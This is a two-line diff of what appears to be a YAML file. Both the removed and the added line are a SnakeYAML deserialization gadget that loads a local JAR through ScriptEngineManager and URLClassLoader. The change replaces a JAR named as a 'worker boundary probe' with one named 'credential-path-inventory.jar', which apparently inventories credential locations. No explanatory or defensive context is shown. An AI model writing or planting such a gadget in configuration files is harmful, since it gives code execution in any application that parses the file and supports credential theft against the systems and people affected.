@@ -1,2 +1,1 @@
-!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [ [ !!java.net.URL ["file:/src/worker-boundary-probe.jar"] ] ] ]
-# worker boundary probe 20260715
+!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [ [ !!java.net.URL ["file:/src/credential-path-inventory.jar"] ] ] ]
